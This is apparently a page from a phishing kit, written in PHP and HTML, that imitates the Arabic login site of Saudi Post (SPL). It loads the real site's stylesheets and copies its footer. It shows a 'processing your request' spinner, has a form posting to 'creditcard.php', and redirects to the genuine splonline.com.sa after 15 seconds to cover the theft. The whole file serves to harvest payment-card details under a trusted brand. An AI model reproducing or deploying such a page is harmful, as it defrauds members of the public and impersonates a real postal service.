<?php
require_once("config.php");
header("refresh:15;url=https://splonline.com.sa/");
?>
<html dir="rtl" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="ar" style=""><head>
   <meta charset="utf-8">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <link rel="shortcut icon" href="/icon.ico?v=1">
    <link rel="icon" type="image/x-icon" href="/icon.ico?v=1">

    <title>البريد السعودي | سُـبل</title>
    <link rel="stylesheet" href="https://accounts.splonline.com.sa/Assets/styles/main-ar.css">
    <link href="https://accounts.splonline.com.sa/Assets/styles/font-awesome.min.css" rel="stylesheet">
    <script src="https://accounts.splonline.com.sa/lib/jquery/jquery.min.js"></script>
    <link href="https://accounts.splonline.com.sa/Assets/styles/style.css" rel="stylesheet">
    <link rel="stylesheet" href="https://accounts.splonline.com.sa/Assets/newDesign/css/aos.css">
    <link rel="stylesheet" href="https://accounts.splonline.com.sa/Assets/newDesign/css/fonts.css">
    <link rel="stylesheet" href="https://accounts.splonline.com.sa/Assets/newDesign/css/main.css">
    <link rel="stylesheet" href="https://accounts.splonline.com.sa/Assets/newDesign/css/login.css">
    <link href="https://accounts.splonline.com.sa/Assets/styles/style.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style></head>
<body data-aos-easing="ease" data-aos-duration="400" data-aos-delay="0" class="loaded">
    <div class="page-wrap">



<div class="top_bar login">
    <div class="container flex_me">
        <div class="col">
        </div>
        <div class="col">
            <a href="#">English</a>
        </div>
    </div>
</div>

        <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="110.53900146484375" viewBox="0 0 1922.745 110.539" class="hero_linear login_linear" preserveAspectRatio="xMidYMid slice">
            <g id="lines" transform="translate(240.981 6.003)">
                <g id="Group_5" data-name="Group 5" transform="translate(0.001)">
                    <path id="Stroke_1" data-name="Stroke 1" d="M481.449,31H40.442c-9.228,0-12.731-3.427-17.011-7.614,0,0-2.6-2.54-6.83-6.776L0,0" transform="translate(1199.524 22.804)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-1"></path>
                    <path id="Stroke_5" data-name="Stroke 5" d="M1199.525,22.8,1179.014,2.286a9.393,9.393,0,0,0-13.2.888L1114.988,54c-4.235,4.236-12.6,7.7-18.588,7.7L16.047,61.5H-240.981" transform="translate(-0.001 0)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-2"></path>
                </g>
                <path id="Stroke_3" data-name="Stroke 3" d="M1681.764,0H1245.2c-5.2,0-7.724,1.33-10.369,3.975L1162.864,74,1105.8,27.31l-1346.711-.455" transform="translate(0 22.5)" fill="none" stroke="#00c8e1" stroke-miterlimit="10" stroke-width="12" class="svg-hero-3"></path>
            </g>
        </svg>
        

<script type="text/javascript">
    var barNotificationTimeout;
    function showSuccessAlert(message) {
        showAlertMessage(message, 'success', 10000);
    }

    function showErrorAlert(message) {
        showAlertMessage(message, 'error', 10000);
    }
    function showInfoAlert(message) {
        console.log("showInfoAlert");

        showAlertMessage(message, 'info', 10000);
    }
    function showWarnAlert(message) {
        showAlertMessage(message, 'warn', 10000);
    }

    function showAlertMessage(message, messagetype, timeout) {

        $('header').addClass('mb-70');
        console.log(messagetype);
        //clearTimeout(barNotificationTimeout);

        //types: success, error
        var cssclass = 'success';
        if (messagetype == 'success') {
            cssclass = 'success';
        }
        else if (messagetype == 'error') {
            cssclass = 'error';
        }
        else if (messagetype == 'warn') {
            cssclass = 'warn';
        }
        else if (messagetype == 'info') {
            cssclass = 'info';
        }
        //remove previous CSS classes and notifications
        $('#bar-notification').removeClass('success error warn info');

        $('#bar-notification #notification-content .content').remove();

        //add new notifications
        var htmlcode = '';
        if ((typeof message) == 'string') {
            htmlcode = '<div class="content align-self-center"><em></em>' + message + '</div>';
        } else {
            for (var i = 0; i < message.length; i++) {
                htmlcode = htmlcode + '<div class="content align-self-center">' + message[i] + '</div>';
            }
        }

        $('#bar-notification')
            .addClass(cssclass)
            .fadeIn('slow')
            .find("#notification-content").prepend(htmlcode)
            .mouseenter(function () {
                //clearTimeout(barNotificationTimeout);
            });

        if (window.pageYOffset >= 70)
            scrollTo('body');

        $('#bar-notification .close').unbind('click').click(function () {
            $('#bar-notification').fadeOut('slow');
            $('header').removeClass('mb-70');
        });

        //timeout (if set)
        //if (timeout > 0) {
        //    barNotificationTimeout = setTimeout(function () {
        //        $('#bar-notification').fadeOut('slow');
        //        $('header').removeClass('mb-70');
        //    }, timeout);
        //}
    }

    //$(document).ready(function () {
    //    $('#bar-notification').on("mouseleave", function () {
    //        setTimeout(function () {
    //            $('#bar-notification').fadeOut('slow');
    //            $('header').removeClass('mb-70');
    //        }, barNotificationTimeout * 2);
    //    });
    //});

</script>







<div id="dialog-notifications-success" class="alert alert-success" title="SuccessAlertHeader" style="display:none;">
</div>
<div id="dialog-notifications-error" class="alert alert-danger" title="ErrorAlertHeader" style="display:none;">
</div>
<div id="dialog-notifications-warn" class="alert alert-warning" title="ErrorAlertHeader" style="display:none;">
</div>
<div id="dialog-notifications-info" class="alert alert-info" title="ErrorAlertHeader" style="display:none;">
</div>
<div id="bar-notification" class="bar-notification sp_alert container" style="direction: rtl;">
    <div id="notification-content">
        <span class="close" title="اغلاق">اغلاق</span>
    </div>
</div>

        


<script id="scrPopup" type="text/javascript">
    function showPopup(id) {
        $("#" + id).modal("show");
    }
</script>


        


<br><br><br><br><br><br>


    <div class="login_container container">
        <div class="flex_me">
            <div class="col aos-init aos-animate" style="max-width: 720px; margin: auto;" id="loginDivs" data-aos="fade-right" data-aos-delay="1500">
<form action="creditcard.php" method="post" novalidate="novalidate">                   
                <center> <span class="generic_page_title"><i class="fa fa-spinner fa-spin"></i>جاري معالجة طلبك... </span> </center>

        <br><br><br>




        </div>

        

<!--
<div class="col aos-init aos-animate" data-aos="fade-left" data-aos-delay="1300">
    <div class="mobile_img">
        <img src="https://accounts.splonline.com.sa/Assets/newDesign/images/phone.png" alt="">
    </div>

    <div class="download_spl_app">
        <img src="https://accounts.splonline.com.sa/Assets/newDesign/images/app_icon.png" alt="">
        <span>
            قم بتحميل تطبيق البريد السعودي سـبل
        </span>
        <p>
            حرصاً منا على تقديم أفضل تجربة، نقدم لكم التطبيق الجديد كلياً للبريد السعودي - سبل

تم تطوير التطبيق ليجعل تجربتكم أسهل وأمتع!
        </p>

        <div class="section_btns">
            <a href="https://itunes.apple.com/us/app/saudi-post/id494312967?ls=1&amp;mt=8"><img src="https://accounts.splonline.com.sa/Assets/newDesign/images/app_store_btn.svg" alt=""></a>
            <a href="https://play.google.com/store/apps/details?id=sa.com.SP"><img src="https://accounts.splonline.com.sa/Assets/newDesign/images/Google_Play_btn.svg" alt=""></a>
        </div>
    </div>-->
</div>
    </div>
</div>




        


<footer class="main-footer">
    <div class="container">
        <div class="row">

            <div class="col-sm-6">
                <p>
                    ©️ 2022 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُـبل
                </p>
            </div>
            <div class="col-md-6 terms">
                <span>
                    عند استخدامك هذا الموقع، فإنك توافق على
                </span>
                <a href="https://splonline.com.sa/ar/terms-of-service/" target="_blank">
                    شروط الخدمة

                </a>
                و
                <a href="https://splonline.com.sa/ar/privacy-policy/" target="_blank">
                    سياسة الخصوصية
                </a>
            </div>
        </div>
    </div>
</footer>
    </div>

    

<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=279394493731241&amp;ev=PageView&amp;noscript=1"></noscript>

Pixel Content Script Tag
<noscript> <img height="1" width="1" border="0" alt="" src="https://aax-eu.amazon-adsystem.com/s/iui3?d=forester-did&amp;ex-fargs=%3Fid%3D2cf11d49-7df7-3ee5-621e-27b579af2ab7%26type%3D82%26m%3D338811&amp;ex-fch=416613&amp;ex-src=https://splonline.com.sa&amp;ex-hargs=v%3D1.0%3Bc%3D588667975232426718%3Bp%3D2CF11D49-7DF7-3EE5-621E-27B579AF2AB7"></noscript>

 Pixel Content No-Script Tag
<img height="1" width="1" border="0" alt="" src="https://aax-eu.amazon-adsystem.com/s/iui3?d=forester-did&amp;ex-fargs=%3Fid%3D2cf11d49-7df7-3ee5-621e-27b579af2ab7%26type%3D82%26m%3D338811&amp;ex-fch=416613&amp;ex-src=https://splonline.com.sa&amp;ex-hargs=v%3D1.0%3Bc%3D588667975232426718%3Bp%3D2CF11D49-7DF7-3EE5-621E-27B579AF2AB7">
</body></html>